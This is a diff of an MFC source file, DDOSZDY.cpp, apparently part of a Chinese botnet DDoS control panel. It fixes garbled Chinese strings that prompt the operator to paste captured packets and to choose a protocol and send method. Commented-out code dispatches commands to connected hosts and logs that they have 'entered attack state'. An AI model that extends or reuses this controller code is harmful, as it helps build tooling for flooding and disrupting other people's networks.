@@ -1,4 +1,4 @@
-// DDOSZDY.cpp : implementation file
+﻿// DDOSZDY.cpp : implementation file
 //
 #include "stdafx.h"
 #include "MainFrm.h"
@@ -61,7 +61,7 @@ CDDOSZDY::CDDOSZDY()
 	m_thread2 = 10;
 	m_time = 10;
 	m_time2 = 10;
-	m_zdy = _T("��ճ��ץ������,Ŀǰֻ֧�����1K����");
+	m_zdy = _T("请粘贴抓包内容,目前只支持最大1K数据");
 	//}}AFX_DATA_INIT
 }
 
@@ -130,13 +130,13 @@ void CDDOSZDY::OnButtonBegin()
 	// TODO: Add 	UpdateData(TRUE);
 	if(cbao == 0)
 	{
-		MessageBox("��ѡ��ʹ��Э��   ","��ʾ", MB_OK|MB_ICONWARNING);
+		MessageBox("请选择使用协议   ","提示", MB_OK|MB_ICONWARNING);
 		return;
 	}
 	
 	if(zhwt == 0)
 	{
-		MessageBox("��ѡ�񷢰���ʽ   ","��ʾ", MB_OK|MB_ICONWARNING);
+		MessageBox("请选择发包方式   ","提示", MB_OK|MB_ICONWARNING);
 		return;
 	}
 	
@@ -176,15 +176,15 @@ void CDDOSZDY::OnButtonBegin()
 // 		{
 // 			SOCKET SerSock = pList->GetItemData(i);
 // 			m_zdyiocp->SendMsg(SerSock,(char *)&go,sizeof(go));
-// 			pList->SetItemText(i,1,"�");
+// 			pList->SetItemText(i,1,"活动");
 // 		}
 // 	}
 // 	n=pMsg->GetItemCount();
 // 	CTime time=CTime::GetCurrentTime();	
-// 	CString m_strTime=time.Format("%Y��%m��%d�� %H:%M:%S");
+// 	CString m_strTime=time.Format("%Y年%m月%d日 %H:%M:%S");
 // 	n=pMsg->GetItemCount();
 // 	pMsg->InsertItem(n,m_strTime);
-// 	pMsg->SetItemText(n,1,"��ѡ�����Ѿ����빥��״̬"); 
+// 	pMsg->SetItemText(n,1,"被选主机已经进入攻击状态"); 
 	
 	
 }
@@ -261,15 +261,15 @@ void CDDOSZDY::OnButtonStop()
 // 		{
 // 			SOCKET SerSock = pList->GetItemData(i);
 // 			m_zdyiocp->SendMsg(SerSock,(char *)&go,sizeof(go));
-// 			pList->SetItemText(i,1,"����");
+// 			pList->SetItemText(i,1,"待命");
 // 		}
 // 	}
 // 	n=pMsg->GetItemCount();
 // 	CTime time=CTime::GetCurrentTime();	
-// 	CString m_strTime=time.Format("%Y��%m��%d�� %H:%M:%S");
+// 	CString m_strTime=time.Format("%Y年%m月%d日 %H:%M:%S");
 // 	n=pMsg->GetItemCount();
 // 	pMsg->InsertItem(n,m_strTime);
-// 	pMsg->SetItemText(n,1,"��ѡ�����Ѿ�ֹͣ����");
+// 	pMsg->SetItemText(n,1,"被选主机已经停止攻击");
 }
 void CDDOSZDY::OnRadioTcp() 
 {
